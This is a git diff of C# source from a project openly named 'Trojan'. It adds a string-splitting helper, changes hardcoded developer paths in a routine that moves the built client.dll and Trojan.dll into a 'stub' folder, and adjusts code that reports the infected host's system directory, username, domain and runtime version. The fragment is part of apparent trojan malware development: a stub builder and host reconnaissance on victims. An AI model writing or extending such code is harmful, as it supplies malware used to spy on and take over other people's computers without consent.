@@ -15,10 +15,12 @@ namespace Trojan
             {
                 throw new ArgumentNullException(nameof(value));
             }
+            
             if (chunkSize < 1)
             {
                 throw new ArgumentOutOfRangeException(nameof(chunkSize));
             }
+
             var sb = new StringBuilder(chunkSize);
             var enumerator = StringInfo.GetTextElementEnumerator(value);
             while (enumerator.MoveNext())
@@ -36,14 +38,25 @@ namespace Trojan
                 sb.Length = 0;
             }
         }
+
+        public static string PartitionAsString(this string value, int chunkSize) 
+        {
+            IEnumerable<string> BuiltString = Partition(value, chunkSize);
+            if (BuiltString != null)
+            {
+                return(string.Join("", BuiltString.ToArray()));
+            }
+            else
+            {
+                return("");
+            }
+        }
     }
 
     public class TrojanBaseClass
     {
         static internal void MoveTrojanStub()
         {
-            //string[] BuildFiles = Directory.GetFiles(TrojanStubLocation);
-
             string[] accepted_files = new string[4]
             {
                 "client.dll",
@@ -52,8 +65,8 @@ namespace Trojan
                 "Trojan.dll"
             };
 
-            string TrojanStubLocation = @"C:\Users\lasse\source\repos\Trojan\client\bin\Debug\net6.0";
-            string new_TrojanStubLocation = @"C:\Users\lasse\source\repos\Trojan\stub";
+            string TrojanStubLocation = @"C:\Users\kaspe\source\repos\Trojan\client\bin\Debug\net6.0";
+            string new_TrojanStubLocation = @"C:\Users\kaspe\source\repos\Trojan\stub";
 
             if (Directory.Exists(new_TrojanStubLocation) && Directory.GetFiles(TrojanStubLocation).Length > 0)
             {
@@ -95,7 +108,7 @@ namespace Trojan
                 CommandOutput.AppendLine("\t[+] " + Environment.SystemDirectory);
                 CommandOutput.AppendLine("\t[+] " + Environment.UserName);
                 CommandOutput.AppendLine("\t[+] " + Environment.UserDomainName);
-                CommandOutput.Append("\t[+] " + Environment.Version.ToString());
+                CommandOutput.AppendLine("\t[+] " + Environment.Version.ToString());
             }
 
             return(CommandOutput.ToString());
